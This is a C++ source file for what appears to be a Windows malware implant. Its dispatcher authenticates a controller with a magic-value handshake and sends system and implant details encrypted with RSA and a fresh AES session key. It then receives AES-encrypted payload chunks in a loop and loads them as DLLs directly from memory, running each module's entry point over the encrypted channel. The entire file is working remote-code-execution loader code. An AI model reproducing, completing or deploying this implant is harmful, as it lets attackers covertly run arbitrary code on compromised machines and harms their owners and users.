#include <Windows.h>
#include <vector>
#include <globalvars.h>
#include <string> 
#include <rsa.h>
#include <AES.h>
#include <random>
#include <mem_ldr.h>

extern CONFIG g_conf;
unsigned char pubkey[283] = { 'R','S','A','1' };

BOOL check_connection(int bytes) {
	if (bytes == -1) {
		return -1;
	}
	else if (bytes == 0) {
		return -1;
	}
	return 1;
}

std::vector<UCHAR> geneate_random(int len) {
	std::random_device engine;
	std::vector<UCHAR> array;
	for (int i = 0; i < len; i++) {
		array.push_back(engine());
	}
	return array;
}
void main_dispatcher(SOCKET client_socket) {
	BCRYPT_ALG_HANDLE hAlgorithm = 0;
	BCRYPT_KEY_HANDLE key = 0;

	sockaddr_in client;
	int client_size = sizeof(client);

	BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_RSA_ALGORITHM, MS_PRIMITIVE_PROVIDER, 0);
	import_pubkey(hAlgorithm, (unsigned char*)pubkey, sizeof(pubkey), &key);

	HELLOREQUEST inital_request;
	int recv_bytes = recv(client_socket, (char*)&inital_request, sizeof(HELLOREQUEST), 0);
	if (check_connection(recv_bytes))
	{
		ULONG magic_val1 = inital_request.val1;
		ULONG magic_val2 = inital_request.val2;

		if (magic_val1 + magic_val2 == MAGIC_VALUE)
		{
			IMPLANTINFO implant_information;
			HELLORESPONSE inital_response;
			SYSTEM_INFO sysinfo;

			std::vector<UCHAR> aes_key = geneate_random(32);
			std::vector<UCHAR> iv = geneate_random(16);

			AES aes(AESKeyLength::AES_256);
			implant_information.implant_arch = IMPLANT_ARCH;
			GetSystemInfo(&sysinfo);
			BOOL wow64 = 0;
			IsWow64Process((HANDLE)-1, &wow64);
			if (wow64)
			{
				implant_information.platform_arch = 0x4;
			}
			else if(sysinfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
			{
				implant_information.platform_arch = 0x8;
			}
			else
			{
				implant_information.platform_arch = 0x4;
			}

			implant_information.implant_id = g_conf.id;
			implant_information.implant_platform = 0x8;
			implant_information.implant_version = IMPLANT_VERSION;
			memcpy(implant_information.session_key, aes_key.data(), aes_key.size());

			PUCHAR encrypted_implant_info;
			ULONG encrypted_implant_info_length;
			encrypt_data(key, (unsigned char*)&implant_information, sizeof(IMPLANTINFO), encrypted_implant_info, encrypted_implant_info_length);
			memcpy(&inital_response.implant_info, encrypted_implant_info, encrypted_implant_info_length);
			memcpy(&inital_response.next_iv, iv.data(), iv.size());

			send(client_socket, (const char*)&inital_response, sizeof(HELLORESPONSE), 0);
			
			while (true)
			{
				std::vector<UCHAR> encrypted_payload_info(64);
				recv_bytes = recv(client_socket, (char*)encrypted_payload_info.data(), encrypted_payload_info.size(), 0);
				if (check_connection(recv_bytes)) {
					std::vector<UCHAR> payload_rawdata = aes.DecryptCBC(encrypted_payload_info, aes_key, iv);
					PPAYLOADINFO payload_info = (PPAYLOADINFO)payload_rawdata.data();
					PPAYLOAD payload_part;
					char* payload = new char[payload_info->payload_size];
					int payload_size = 0;
					do
					{
						std::vector<UCHAR> encrypted_payload(4096);
						recv_bytes = recv(client_socket, (char*)encrypted_payload.data(), encrypted_payload.size(), 0);
						std::vector<UCHAR> payload_rawpart = aes.DecryptCBC(encrypted_payload, aes_key, iv);
						payload_part = (PPAYLOAD)payload_rawpart.data();
						memcpy(payload + payload_size, payload_part->payload_part, payload_part->part_size);
						payload_size += payload_part->part_size;
					} while (payload_part->part_size != 0);
					
					if (payload_info->payload_type == PAYLOAD_DLL)
					{
						LONGLONG* payload_addr = (long long*)_LoadLibrary(payload);
						LONGLONG* pModuleEntrypoint = (LONGLONG*)_GetProcAddress((HMODULE)payload_addr, "ModuleEntrypoint");
						if (pModuleEntrypoint)
						{
							MODULE_CONTEXT mod_ctx;
							mod_ctx.connection = client_socket;
							mod_ctx.aes_key = aes_key;
							mod_ctx.iv_key = iv;
							mod_ctx.recv_encrypted = recv_encrypted;
							mod_ctx.send_encrypted = send_encrypted;
							((void(*)(MODULE_CONTEXT))pModuleEntrypoint)(mod_ctx);
							_UnloadLibrary(payload_addr);
						}
					}
					else if (payload_info->payload_type == PAYLOAD_RAW) {
						return;
					}
					else
					{
						return;
					}
				}
				else
				{
					return;
				}
			}
			return;
		}
	}
}